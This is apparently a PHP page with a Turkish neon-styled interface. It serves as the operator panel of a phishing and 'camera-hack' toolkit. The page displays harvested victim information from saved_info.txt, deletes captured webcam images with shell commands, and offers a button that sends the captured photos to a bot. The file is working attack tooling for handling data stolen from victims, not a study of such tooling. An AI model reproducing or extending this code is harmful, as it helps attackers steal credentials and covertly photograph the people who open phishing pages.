<?php
//echo '<script>alert(0)</script>';
$url = $_SERVER['REQUEST_URI'];
if (strpos($url,"photo_send")){
	shell_exec("echo 'sendPhoto .png' > images/_command");
	echo '<script>alert("Resimler Bota Gönderiliyor..")</script>';
}
if (strpos($url,"del")){
	$file_control = file_exists('phishing-tools.php');
	if ($file_control){
	shell_exec("bash phishing_files/saved-all.sh del");
	}
	$control = shell_exec("ls images/cam* |wc -l");
	if ($control == "0"){ 
	unlink ("saved_info.txt");
	}else{
	shell_exec("rm images/cam*");
	unlink ("saved_info.txt");
	}
}
if (strpos($url,"camera-hack")){
	$title = "Resimler";
	$info = "Resim";
	$del_info = "RESİMLERİ";
}else{
	$title = "Bilgiler";
	$info = "Bilgi";
	$del_info = "BİLGİLERİ";
}
?>
<!DOCTYPE html>
<html>
<head>
<link rel="icon" href="http://localhost:4444/phishing-tools/phishing_files/icon.png" type="image/x-icon"/>
    <title>SAVED İNFO</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Kiwi+Maru:wght@300&display=swap');
* {
  margin: 0;
  padding: 0;
list-style:none;
text-decoration: none;
}

body {
  background: #000;
  font-family: 'Kiwi Maru', serif;
  box-sizing: border-box;
}
h3 a {
  display: inline-block;
  position: relative;
  padding: 20px 20px 40px 0;
  color: #7CFC00;
  font-size: 20px;
  font-weight: 600;
  text-decoration: none;
  overflow: hidden;
  transition: .5s;
  margin-top: 40px;
  /*letter-spacing: 4px*/
}
.information {
  text-align: center;
  font-size: 30px;
  color: lime;
  padding: 50px 20px;
  border: 1px solid lime;
  border-radius: 10px; 

}
.box {
position: absolute;
left: 16%;
top: 15%;
background: black;
border-radius: 15px;
padding: 100px;
padding-bottom: 50px;
box-shadow: 0 0 5px #03e9f4,
     0 0 25px #03e9f4,
      0 0 50px #03e9f4 ,
       0 0 200px #03e9f4;
}
.box h1 {
font-size: 50px;
color:white;
text-align: center;
padding: 50px 0 50px 0;
margin-top: 40px;
}
.box h2 {
font-size: 30px;
color:white;
text-align: center;
padding: 50px 0 50px 0;
margin-top: 40px;
}
.green-neon {
   text-shadow: 2px 2px 1px rgba(0,0,0,.4),
    0 0 20px #69F0AE,
    0 0 40px rgba(0, 230, 118, .75),
    0 0 50px rgba(0, 230, 118, .75),
    0 0 100px rgba(0, 230, 118, .75);
}
.green-neon:before{
  content:'';
  background: rgba(105, 240, 174, .25);
  z-index: -1;
  opacity: .7;
  filter: blur(30px);
  width: 100%;
  height: 100%;
}

.saved-box{
display: block;
position: relative;
width: 300px;
height: 320px;
background: none;
border: 2px solid #7cfc00;
border-radius: 15px;
left: 92px;
color: black;
margin-bottom: 15px;
font-size: 18px;
transition: all 0.25s;
}
.saved-box:hover{
left: 75px;
padding: 15px;
padding-bottom: 40px;
box-shadow:
0 0 25px #7cfc00,
0 0 25px #7cfc00,
0 0 25px #7cfc00,
0 0 25px #7cfc00;
font-size: 20px;
}

.saved-box:hover + hr{
display: none;
}


.saved-box li {
color: #7cfc00;
padding: 5px 15px;
}
.saved-box .saved-title{
color: #ff0000;
text-align: center;
font-size: 25px;
}
ul li a {
color: white;
}
hr {
width: 300px;
margin: auto;
border: 2px solid white;
}

.settings-box li{
display: inline-block;
margin-left: 40px;
}
.settings-box li a{
font-family: 'Kiwi Maru', serif;
background: black;
border-radius: 10px;
padding: 15px 10px;
color: white;
font-size: 17px;
text-align: center;
box-shadow: 0 0 5px yellow,
            0 0 15px yellow,
            0 0 20px yellow,
	    0 0 30px yellow;

}

.settings-box li a:hover{
  box-shadow: 0 0 5px cyan,
              0 0 15px cyan,
              0 0 20px cyan,
	      0 0 30px cyan;
}
.settings-box li .del{
  box-shadow: 0 0 5px #ff0000,
              0 0 15px #ff0000,
              0 0 20px #ff0000,
	      0 0 30px #ff0000;

}
.bot-photo-send{
position: absolute;
display: block;
margin-top: -80px;
right: 20px;
box-shadow: 0 0 5px #7cfc00,
              0 0 15px #7cfc00,
              0 0 20px #7cfc00,
	      0 0 30px #7cfc00;


}
.bot-photo-send .photo-send-btn{
box-shadow: 0 0 5px #7cfc00,
              0 0 15px #7cfc00,
              0 0 20px #7cfc00,
	      0 0 30px #7cfc00;

}
</style>
</head>
<body >
<div class="box">
<ul class="settings-box">
<?php 
echo "	<li><a href=\"$_SERVER[PHP_SELF]\">GERİ</a></li>
	<li><a href='/index.php'>ANASAYFA</a></li>";
$sonuc = file_exists('saved_info.txt');
$control = file_exists('phishing-tools.php');
if ($sonuc){
	if ($control){
		echo "<li><a href='?all_del' class='del'>TÜM $del_info SİL</a></li>";
	}else{
		echo "<li><a href='?saved_del' class='del'>TÜM $del_info SİL</a></li>";
		if (strpos($url,"camera-hack")){ 
		echo "<li class='bot-photo-send'><a href='?saved_photo_send' class='photo-send-btn'>TÜM $del_info BOTA GÖNDER</a></li>";
		}
	}}
?>
</ul>
<h1 class="green-neon">Kaydedilen <?php echo $title;?></h1>
<?php
$sonuc = file_exists('saved_info.txt');
if ($sonuc){
        $output = shell_exec('cat saved_info.txt');
	echo "<br><br>$output";
}else{
$url = $_SERVER['REQUEST_URI'];

if (strpos($url,"del")){
	echo "<h2>Tüm $title Silindi...</h2>";}else{

	echo "<h2>Henüz Kaydedilen $info Yok...</h2>";
}}
?>
</div>
</body>
</html>

